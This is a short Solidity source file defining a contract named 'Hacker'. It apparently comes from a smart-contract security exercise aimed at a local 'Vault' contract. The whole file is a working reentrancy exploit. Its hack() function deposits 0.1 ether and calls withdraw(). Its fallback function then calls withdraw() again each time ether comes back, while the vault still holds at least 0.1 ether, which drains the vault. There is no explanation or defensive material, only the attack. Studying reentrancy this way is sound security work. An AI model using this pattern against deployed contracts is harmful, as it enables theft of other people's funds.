// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";

contract Hacker {

    address payable vault;

    constructor(address _vaultAddress) {
        vault = payable(_vaultAddress);
    }   

    fallback() external payable{
        if(vault.balance >= 0.1 ether){
            Vault(vault).withdraw();
        }
    }

    function hack() public {
        // 1. deposiot 0.1 ether to Vault
        Vault(vault).deposite{value: 0.1 ether}();

        // 2. call withdraw function
        Vault(vault).withdraw();
    }




}